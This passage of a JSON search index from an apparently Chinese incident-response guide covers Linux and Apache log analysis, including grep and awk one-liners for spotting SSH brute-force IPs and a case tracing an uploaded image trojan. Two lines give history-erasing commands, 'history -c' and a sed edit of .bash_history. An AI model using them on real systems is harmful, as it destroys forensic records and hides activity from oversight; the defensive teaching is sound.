\u4ec5\u6e05\u7406\u5f53\u524d\u7528\u6237\uff1a history -c","title":"0x01 \u65e5\u5fd7\u7b80\u4ecb"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x02-\u65e5\u5fd7\u5206\u6790\u6280\u5de7","text":"","title":"0x02 \u65e5\u5fd7\u5206\u6790\u6280\u5de7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#a\u5e38\u7528\u7684shell\u547d\u4ee4","text":"Linux\u4e0b\u5e38\u7528\u7684shell\u547d\u4ee4\u5982\uff1afind\u3001grep \u3001egrep\u3001awk\u3001sed \u5c0f\u6280\u5de7\uff1a 1\u3001grep\u663e\u793a\u524d\u540e\u51e0\u884c\u4fe1\u606f: \u200b \u6807\u51c6unix/linux\u4e0b\u7684grep\u901a\u8fc7\u4e0b\u9762\u53c3\u6570\u63a7\u5236\u4e0a\u4e0b\u6587\uff1a \u200b grep -C 5 foo file \u663e\u793afile\u6587\u4ef6\u91cc\u5339\u914dfoo\u5b57\u4e32\u90a3\u884c\u4ee5\u53ca\u4e0a\u4e0b5\u884c \u200b grep -B 5 foo file \u663e\u793afoo\u53ca\u524d5\u884c \u200b grep -A 5 foo file \u663e\u793afoo\u53ca\u540e5\u884c \u200b \u67e5\u770bgrep\u7248\u672c\u53f7\u7684\u65b9\u6cd5\u662f \u200b grep -V 2\u3001grep \u67e5\u627e\u542b\u6709\u67d0\u5b57\u7b26\u4e32\u7684\u6240\u6709\u6587\u4ef6 grep -rn \"hello,world!\" * : \u8868\u793a\u5f53\u524d\u76ee\u5f55\u6240\u6709\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u67d0\u4e2a\u6587\u4ef6\u540d -r \u662f\u9012\u5f52\u67e5\u627e -n \u662f\u663e\u793a\u884c\u53f7 -R \u67e5\u627e\u6240\u6709\u6587\u4ef6\u5305\u542b\u5b50\u76ee\u5f55 -i \u5ffd\u7565\u5927\u5c0f\u5199 3\u3001\u5982\u4f55\u663e\u793a\u4e00\u4e2a\u6587\u4ef6\u7684\u67d0\u51e0\u884c\uff1a cat input_file | tail -n +1000 | head -n 2000 #\u4ece\u7b2c1000\u884c\u5f00\u59cb\uff0c\u663e\u793a2000\u884c\u3002\u5373\u663e\u793a1000~2999\u884c 4\u3001find /etc -name init //\u5728\u76ee\u5f55/etc\u4e2d\u67e5\u627e\u6587\u4ef6init 5\u3001\u53ea\u662f\u663e\u793a/etc/passwd\u7684\u8d26\u6237 `cat /etc/passwd |awk -F ':' '{print $1}'` //awk -F\u6307\u5b9a\u57df\u5206\u9694\u7b26\u4e3a':'\uff0c\u5c06\u8bb0\u5f55\u6309\u6307\u5b9a\u7684\u57df\u5206\u9694\u7b26\u5212\u5206\u57df\uff0c\u586b\u5145\u57df\uff0c\u200b$0\u5219\u8868\u793a\u6240\u6709\u57df,$1\u8868\u793a\u7b2c\u4e00\u4e2a\u57df,\u200b$n\u8868\u793a\u7b2cn\u4e2a\u57df\u3002 6\u3001sed -i '153,$d' .bash_history \u5220\u9664\u5386\u53f2\u64cd\u4f5c\u8bb0\u5f55\uff0c\u53ea\u4fdd\u7559\u524d153\u884c","title":"A\u3001\u5e38\u7528\u7684shell\u547d\u4ee4"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#b\u65e5\u5fd7\u5206\u6790\u6280\u5de7","text":"A\u3001/var/log/secure 1\u3001\u5b9a\u4f4d\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673a\u7684root\u5e10\u53f7\uff1a grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1a grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c \u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2\u3001\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3\u3001\u589e\u52a0\u4e00\u4e2a\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4\u3001\u5220\u9664\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5\u3001su\u5207\u6362\u7528\u6237\uff1a Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo\u6388\u6743\u6267\u884c: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 2\u3001/var/log/yum.log \u8f6f\u4ef6\u5b89\u88c5\u5347\u7ea7\u5378\u8f7d\u65e5\u5fd7\uff1a ~ yum install gcc yum install gcc [root@bogon ~]# more /var/log/yum.log Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 ~","title":"B\u3001\u65e5\u5fd7\u5206\u6790\u6280\u5de7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","text":"\u7b2c3\u7bc7:Web\u65e5\u5fd7\u5206\u6790 \u00b6 ox01 Web\u65e5\u5fd7 \u00b6 Web\u8bbf\u95ee\u65e5\u5fd7\u8bb0\u5f55\u4e86Web\u670d\u52a1\u5668\u63a5\u6536\u5904\u7406\u8bf7\u6c42\u53ca\u8fd0\u884c\u65f6\u9519\u8bef\u7b49\u5404\u79cd\u539f\u59cb\u4fe1\u606f\u3002\u901a\u8fc7\u5bf9WEB\u65e5\u5fd7\u8fdb\u884c\u7684\u5b89\u5168\u5206\u6790\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5b9a\u4f4d\u653b\u51fb\u8005\uff0c\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u8fd8\u539f\u653b\u51fb\u8def\u5f84\uff0c\u627e\u5230\u7f51\u7ad9\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\u5e76\u8fdb\u884c\u4fee\u590d\u3002 \u6211\u4eec\u6765\u770b\u4e00\u6761Apache\u7684\u8bbf\u95ee\u65e5\u5fd7\uff1a 127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] \"GET /login.html HTTP/1.1\" 200 786 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36\" \u901a\u8fc7\u8fd9\u6761Web\u8bbf\u95ee\u65e5\u5fd7\uff0c\u6211\u4eec\u53ef\u4ee5\u6e05\u695a\u7684\u5f97\u77e5\u7528\u6237\u5728\u4ec0\u4e48IP\u3001\u4ec0\u4e48\u65f6\u95f4\u3001\u7528\u4ec0\u4e48\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ec0\u4e48\u6d4f\u89c8\u5668\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u4e86\u4f60\u7f51\u7ad9\u7684\u54ea\u4e2a\u9875\u9762\uff0c\u662f\u5426\u8bbf\u95ee\u6210\u529f\u3002 \u672c\u6587\u901a\u8fc7\u4ecb\u7ecdWeb\u65e5\u5fd7\u5b89\u5168\u5206\u6790\u65f6\u7684\u601d\u8def\u548c\u5e38\u7528\u7684\u4e00\u4e9b\u6280\u5de7\u3002 0x02 \u65e5\u5fd7\u5206\u6790\u6280\u5de7 \u00b6 \u5728\u5bf9WEB\u65e5\u5fd7\u8fdb\u884c\u5b89\u5168\u5206\u6790\u65f6\uff0c\u4e00\u822c\u53ef\u4ee5\u6309\u7167\u4e24\u79cd\u601d\u8def\u5c55\u5f00\uff0c\u9010\u6b65\u6df1\u5165\uff0c\u8fd8\u539f\u6574\u4e2a\u653b\u51fb\u8fc7\u7a0b\u3002 \u7b2c\u4e00\u79cd\uff1a\u786e\u5b9a\u5165\u4fb5\u7684\u65f6\u95f4\u8303\u56f4\uff0c\u4ee5\u6b64\u4e3a\u7ebf\u7d22\uff0c\u67e5\u627e\u8fd9\u4e2a\u65f6\u95f4\u8303\u56f4\u5185\u53ef\u7591\u7684\u65e5\u5fd7\uff0c\u8fdb\u4e00\u6b65\u6392\u67e5\uff0c\u6700\u7ec8\u786e\u5b9a\u653b\u51fb\u8005\uff0c\u8fd8\u539f\u653b\u51fb\u8fc7\u7a0b\u3002 \u7b2c\u4e8c\u79cd\uff1a\u653b\u51fb\u8005\u5728\u5165\u4fb5\u7f51\u7ad9\u540e\uff0c\u901a\u5e38\u4f1a\u7559\u4e0b\u540e\u95e8\u7ef4\u6301\u6743\u9650\uff0c\u4ee5\u65b9\u4fbf\u518d\u6b21\u8bbf\u95ee\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u8be5\u6587\u4ef6\uff0c\u5e76\u4ee5\u6b64\u4e3a\u7ebf\u7d22\u6765\u5c55\u5f00\u5206\u6790\u3002 \u5e38\u7528\u5206\u6790\u5de5\u5177\uff1a Window\u4e0b\uff0c\u63a8\u8350\u7528 EmEditor \u8fdb\u884c\u65e5\u5fd7\u5206\u6790\uff0c\u652f\u6301\u5927\u6587\u672c\uff0c\u641c\u7d22\u6548\u7387\u8fd8\u4e0d\u9519\u3002 Linux\u4e0b\uff0c\u4f7f\u7528Shell\u547d\u4ee4\u7ec4\u5408\u67e5\u8be2\u5206\u6790\u3002 Shell+Linux\u547d\u4ee4\u5b9e\u73b0\u65e5\u5fd7\u5206\u6790\uff0c\u4e00\u822c\u7ed3\u5408grep\u3001awk\u7b49\u547d\u4ee4\u7b49\u5b9e\u73b0\u4e86\u51e0\u4e2a\u5e38\u7528\u7684\u65e5\u5fd7\u5206\u6790\u7edf\u8ba1\u6280\u5de7\u3002 Apache\u65e5\u5fd7\u5206\u6790\u6280\u5de7\uff1a 1\u3001\u5217\u51fa\u5f53\u5929\u8bbf\u95ee\u6b21\u6570\u6700\u591a\u7684IP\u547d\u4ee4\uff1a cut -d- -f 1 log_file|uniq -c | sort -rn | head -20 2\u3001\u67e5\u770b\u5f53\u5929\u6709\u591a\u5c11\u4e2aIP\u8bbf\u95ee\uff1a awk '{print $1}' log_file|sort|uniq|wc -l 3\u3001\u67e5\u770b\u67d0\u4e00\u4e2a\u9875\u9762\u88ab\u8bbf\u95ee\u7684\u6b21\u6570\uff1a grep \"/index.php\" log_file | wc -l 4\u3001\u67e5\u770b\u6bcf\u4e00\u4e2aIP\u8bbf\u95ee\u4e86\u591a\u5c11\u4e2a\u9875\u9762\uff1a awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file 5\u3001\u5c06\u6bcf\u4e2aIP\u8bbf\u95ee\u7684\u9875\u9762\u6570\u8fdb\u884c\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff1a awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n 6\u3001\u67e5\u770b\u67d0\u4e00\u4e2aIP\u8bbf\u95ee\u4e86\u54ea\u4e9b\u9875\u9762\uff1a grep ^111.111.111.111 log_file| awk '{print $1,$7}' 7\u3001\u53bb\u6389\u641c\u7d22\u5f15\u64ce\u7edf\u8ba1\u5f53\u5929\u7684\u9875\u9762\uff1a awk '{print $12,$1}' log_file | grep ^\\\"Mozilla | awk '{print $2}' |sort | uniq | wc -l 8\u3001\u67e5\u770b2018\u5e746\u670821\u65e514\u65f6\u8fd9\u4e00\u4e2a\u5c0f\u65f6\u5185\u6709\u591a\u5c11IP\u8bbf\u95ee: awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l 0x03 \u65e5\u5fd7\u5206\u6790\u6848\u4f8b \u00b6 Web\u65e5\u5fd7\u5206\u6790\u5b9e\u4f8b\uff1a\u901a\u8fc7nginx\u4ee3\u7406\u8f6c\u53d1\u5230\u5185\u7f51\u67d0\u670d\u52a1\u5668\uff0c\u5185\u7f51\u670d\u52a1\u5668\u67d0\u7ad9\u70b9\u76ee\u5f55\u4e0b\u88ab\u4e0a\u4f20\u4e86\u591a\u4e2a\u56fe\u7247\u6728\u9a6c\uff0c\u867d\u7136II7\u4e0b\u4e0d\u80fd\u89e3\u6790\uff0c\u4f46\u8fd8\u662f\u60f3\u627e\u51fa\u8c01\u901a\u8fc7\u4ec0\u4e48\u8def\u5f84\u4e0a\u4f20\u7684\u3002 \u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u9047\u5230\u4e86\u4e00\u4e2a\u95ee\u9898\uff1a\u7531\u4e8e\u8bbe\u7f6e\u4e86\u4ee3\u7406\u8f6c\u53d1\uff0c\u53ea\u8bb0\u5f55\u4e86\u4ee3\u7406\u670d\u52a1\u5668\u7684ip\uff0c\u5e76\u6ca1\u6709\u8bb0\u5f55\u8bbf\u95ee\u8005IP\uff1f\u8fd9\u65f6\u5019\uff0c\u5982\u4f55\u53bb\u8bc6\u522b\u4e0d\u540c\u7684\u8bbf\u95ee\u8005\u548c\u653b\u51fb\u6e90\u5462\uff1f \u8fd9\u662f\u7ba1\u7406\u5458\u65e5\u5fd7\u914d\u7f6e\u4e0d\u5f53\u7684\u95ee\u9898\uff0c\u4f46\u597d\u5728\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6d4f\u89c8\u5668\u6307\u7eb9\u6765\u5b9a\u4f4d\u4e0d\u540c\u7684\u8bbf\u95ee\u6765\u6e90\uff0c\u8fd8\u539f\u653b\u51fb\u8def\u5f84\u3002 1\u3001\u5b9a\u4f4d\u653b\u51fb\u6e90 \u9996\u5148\u8bbf\u95ee\u56fe\u7247\u6728\u9a6c\u7684\u8bb0\u5f55\uff0c\u53ea\u627e\u5230\u4e86\u4e00\u6761\uff0c\u7531\u4e8e\u6240\u6709\u8bbf\u95ee\u65e5\u5fd7\u53ea\u8bb0\u5f55\u4e86\u4ee3\u7406IP\uff0c\u5e76\u4e0d\u80fd\u901a\u8fc7IP\u6765\u8fd8\u539f\u653b\u51fb\u8def\u5f84\uff0c\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u6d4f\u89c8\u5668\u6307\u7eb9\u6765\u5b9a\u4f4d\u3002 \u6d4f\u89c8\u5668\u6307\u7eb9\uff1a Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E) 2\u3001\u641c\u7d22\u76f8\u5173\u65e5\u5fd7\u8bb0\u5f55 \u901a\u8fc7\u7b5b\u9009\u4e0e\u8be5\u6d4f\u89c8\u5668\u6307\u7eb9\u6709\u5173\u7684\u65e5\u5fd7\u8bb0\u5f55\uff0c\u53ef\u4ee5\u6e05\u6670\u5730\u770b\u5230\u653b\u51fb\u8005\u7684\u653b\u51fb\u8def\u5f84\u3002 3\u3001\u5bf9\u627e\u5230\u7684\u8bbf\u95ee\u65e5\u5fd7\u8fdb\u884c\u89e3\u8bfb\uff0c\u653b\u51fb\u8005\u5927\u81f4\u7684\u8bbf\u95ee\u8def\u5f84\u5982\u4e0b\uff1a A\u3001\u653b\u51fb\u8005\u8bbf\u95ee\u9996\u9875\u548c\u767b\u5f55\u9875 B\u3001\u653b\u51fb\u8005\u8bbf\u95eeMsgSjlb.aspx\u548cMsgSebd.aspx C\u3001\u653b\u51fb\u8005\u8bbf\u95eeXzuser.aspx D\u3001\u653b\u51fb\u8005\u591a\u6b21POST\uff08\u6000\u7591\u901a\u8fc7\u8fd9\u4e2a\u9875\u9762\u4e0a\u4f20\u6a21\u5757\u7f3a\u9677\uff09 E\u3001\u653b\u51fb\u8005\u8bbf\u95ee\u4e86\u56fe\u7247\u6728\u9a6c \u6253\u5f00\u7f51\u7ad9\uff0c\u8bbf\u95eeXzuser.aspx\uff0c\u786e\u8ba4\u653b\u51fb\u8005\u901a\u8fc7\u8be5\u9875\u9762\u7684\u8fdb\u884c\u6587\u4ef6\u4e0a\u4f20\u4e86\u56fe\u7247\u6728\u9a6c\uff0c\u540c\u65f6\uff0c\u53d1\u73b0\u7f51\u7ad9\u4e86\u5b58\u5728\u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u8bbf\u95ee\u7279\u5b9aURL\uff0c\u65e0\u9700\u767b\u5f55\u5373\u53ef\u8fdb\u5165\u540e\u53f0\u754c\u9762\u3002\u901a\u8fc7\u65e5\u5fd7\u5206\u6790\u627e\u5230\u7f51\u7ad9\u7684\u6f0f\u6d1e\u4f4d\u7f6e\u5e76\u8fdb\u884c\u4fee\u590d\u3002 0x04 \u65e5\u5fd7\u7edf\u8ba1\u5206\u6790\u6280\u5de7 \u00b6 \u7edf\u8ba1\u722c\u866b\uff1a grep - E 'Googlebot|Baiduspider' / www / logs / access .2019 - 02 - 23. log | awk '{ print $1 }' | sort | uniq \u7edf\u8ba1\u6d4f\u89c8\u5668\uff1a cat / www / logs / access .2019 - 02 - 23. log | grep - v - E 'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon' | sort | uniq - c | sort - r - n | head - n 100 IP \u7edf\u8ba1\uff1a grep '23/May/2019' / www / logs / access .2019 - 02 - 23. log | awk '{print $1}' | awk - F '.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq - c | sort - r - n | head - n 10 2206 219.136.134.13 1497 182.34.15.248 1431 211.140.143.100 1431 119.145.149.106 1427 61.183.15.179 1427 218.6.8.189 1422 124.232.150.171 1421 106.187.47.224 1420 61.160.220.252 1418 114.80.201.18 \u7edf\u8ba1\u7f51\u6bb5\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $1}' | awk - F '.' '{print $1\".\"$2\".\"$3\".0\"}' | sort | uniq - c | sort - r - n | head - n 200 \u7edf\u8ba1\u57df\u540d\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $2}' | sort | uniq - c | sort - rn | more HTTP Status\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $9}' | sort | uniq - c | sort - rn | more 5056585 304 1125579 200 7602 400 5 301 URL \u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $7}' | sort | uniq - c | sort - rn | more \u6587\u4ef6\u6d41\u91cf\u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}' | sort - rn | more grep ' 200 ' / www / logs / access .2019 - 02 - 23. log | awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}' | sort - rn | more URL\u8bbf\u95ee\u91cf\u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $7}' | egrep '\\?|&' | sort | uniq - c | sort - rn | more \u811a\u672c\u8fd0\u884c\u901f\u5ea6\uff1a \u67e5\u51fa\u8fd0\u884c\u901f\u5ea6\u6700\u6162\u7684\u811a\u672c grep - v 0 $ / www / logs / access .2019 - 02 - 23. log | awk - F '\\\" ' '{print $4\" \" $1}' web . log | awk '{print $1\" \"$8}' | sort - n - k 1 - r | uniq > /tmp/slow_url.txt IP, URL \u62bd\u53d6\uff1a # tail - f / www / logs / access .2019 - 02 - 23. log | grep '/test.html' | awk '{print $1\" \"$7}'","title":"\u7b2c3\u7bc7\uff1aWeb\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#\u7b2c3\u7bc7web\u65e5\u5fd7\u5206\u6790","text":"","title":"\u7b2c3\u7bc7:Web\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#ox01--web\u65e5\u5fd7","text":"Web\u8bbf\u95ee\u65e5\u5fd7\u8bb0\u5f55\u4e86Web\u670d\u52a1\u5668\u63a5\u6536\u5904\u7406\u8bf7\u6c42\u53ca\u8fd0\u884c\u65f6\u9519\u8bef\u7b49\u5404\u79cd\u539f\u59cb\u4fe1\u606f\u3002\u901a\u8fc7\u5bf9WEB\u65e5\u5fd7\u8fdb\u884c\u7684\u5b89\u5168\u5206\u6790\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5b9a\u4f4d\u653b\u51fb\u8005\uff0c\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u8fd8\u539f\u653b\u51fb\u8def\u5f84\uff0c\u627e\u5230\u7f51\u7ad9\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\u5e76\u8fdb\u884c\u4fee\u590d\u3002 \u6211\u4eec\u6765\u770b\u4e00\u6761Apache\u7684\u8bbf\u95ee\u65e5\u5fd7\uff1a 127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] \"GET /login.html HTTP/1.1\" 200 786 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36\" \u901a\u8fc7\u8fd9\u6761Web\u8bbf\u95ee\u65e5\u5fd7\uff0c\u6211\u4eec\u53ef\u4ee5\u6e05\u695a\u7684\u5f97\u77e5\u7528\u6237\u5728\u4ec0\u4e48IP\u3001\u4ec0\u4e48\u65f6\u95f4\u3001\u7528\u4ec0\u4e48\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ec0\u4e48\u6d4f\u89c8\u5668\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u4e86\u4f60\u7f51\u7ad9\u7684\u54ea\u4e2a\u9875\u9762\uff0c\u662f\u5426\u8bbf\u95ee\u6210\u529f\u3002 \u672c\u6587\u901a\u8fc7\u4ecb\u7ecdWeb\u65e5\u5fd7\u5b89\u5168\u5206\u6790\u65f6\u7684\u601d\u8def\u548c\u5e38\u7528\u7684\u4e00\u4e9b\u6280\u5de7\u3002","title":"ox01  Web\u65e5\u5fd7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x02-\u65e5\u5fd7\u5206\u6790\u6280\u5de7","text":"\u5728\u5bf9WEB\u65e5\u5fd7\u8fdb\u884c\u5b89\u5168\u5206\u6790\u65f6\uff0c\u4e00\u822c\u53ef\u4ee5\u6309\u7167\u4e24\u79cd\u601d\u8def\u5c55\u5f00\uff0c\u9010\u6b65\u6df1\u5165\uff0c\u8fd8\u539f\u6574\u4e2a\u653b\u51fb\u8fc7\u7a0b\u3002 \u7b2c\u4e00\u79cd\uff1a\u786e\u5b9a\u5165\u4fb5\u7684\u65f6\u95f4\u8303\u56f4\uff0c\u4ee5\u6b64\u4e3a\u7ebf\u7d22\uff0c\u67e5\u627e\u8fd9\u4e2a\u65f6\u95f4\u8303\u56f4\u5185\u53ef\u7591\u7684\u65e5\u5fd7\uff0c\u8fdb\u4e00\u6b65\u6392\u67e5\uff0c\u6700\u7ec8\u786e\u5b9a\u653b\u51fb\u8005\uff0c\u8fd8\u539f\u653b\u51fb\u8fc7\u7a0b\u3002 \u7b2c\u4e8c\u79cd\uff1a\u653b\u51fb\u8005\u5728\u5165\u4fb5\u7f51\u7ad9\u540e\uff0c\u901a\u5e38\u4f1a\u7559\u4e0b\u540e\u95e8\u7ef4\u6301\u6743\u9650\uff0c\u4ee5\u65b9\u4fbf\u518d\u6b21\u8bbf\u95ee\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u8be5\u6587\u4ef6\uff0c\u5e76\u4ee5\u6b64\u4e3a\u7ebf\u7d22\u6765\u5c55\u5f00\u5206\u6790\u3002 \u5e38\u7528\u5206\u6790\u5de5\u5177\uff1a Window\u4e0b\uff0c\u63a8\u8350\u7528 EmEditor \u8fdb\u884c\u65e5\u5fd7\u5206\u6790\uff0c\u652f\u6301\u5927\u6587\u672c\uff0c\u641c\u7d22\u6548\u7387\u8fd8\u4e0d\u9519\u3002 Linux\u4e0b\uff0c\u4f7f\u7528Shell\u547d\u4ee4\u7ec4\u5408\u67e5\u8be2\u5206\u6790\u3002 Shell+Linux\u547d\u4ee4\u5b9e\u73b0\u65e5\u5fd7\u5206\u6790\uff0c\u4e00\u822c\u7ed3\u5408grep\u3001awk\u7b49\u547d\u4ee4\u7b49\u5b9e\u73b0\u4e86\u51e0\u4e2a\u5e38\u7528\u7684\u65e5\u5fd7\u5206\u6790\u7edf\u8ba1\u6280\u5de7\u3002 Apache\u65e5\u5fd7\u5206\u6790\u6280\u5de7\uff1a 1\u3001\u5217\u51fa\u5f53\u5929\u8bbf\u95ee\u6b21\u6570\u6700\u591a\u7684IP\u547d\u4ee4\uff1a cut -d- -f 1 log_file|uniq -c | sort -rn | head -20 2\u3001\u67e5\u770b\u5f53\u5929\u6709\u591a\u5c11\u4e2aIP\u8bbf\u95ee\uff1a awk '{print $1}' log_file|sort|uniq|wc -l 3\u3001\u67e5\u770b\u67d0\u4e00\u4e2a\u9875\u9762\u88ab\u8bbf\u95ee\u7684\u6b21\u6570\uff1a grep \"/index.php\" log_file | wc -l 4\u3001\u67e5\u770b\u6bcf\u4e00\u4e2aIP\u8bbf\u95ee\u4e86\u591a\u5c11\u4e2a\u9875\u9762\uff1a awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file 5\u3001\u5c06\u6bcf\u4e2aIP\u8bbf\u95ee\u7684\u9875\u9762\u6570\u8fdb\u884c\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff1a awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n 6\u3001\u67e5\u770b\u67d0\u4e00\u4e2aIP\u8bbf\u95ee\u4e86\u54ea\u4e9b\u9875\u9762\uff1a grep ^111.111.111.111 log_file| awk '{print $1,$7}' 7\u3001\u53bb\u6389\u641c\u7d22\u5f15\u64ce\u7edf\u8ba1\u5f53\u5929\u7684\u9875\u9762\uff1a awk '{print $12,$1}' log_file | grep ^\\\"Mozilla | awk '{print $2}' |sort | uniq | wc -l 8\u3001\u67e5\u770b2018\u5e746\u670821\u65e514\u65f6\u8fd9\u4e00\u4e2a\u5c0f\u65f6\u5185\u6709\u591a\u5c11IP\u8bbf\u95ee: awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l","title":"0x02 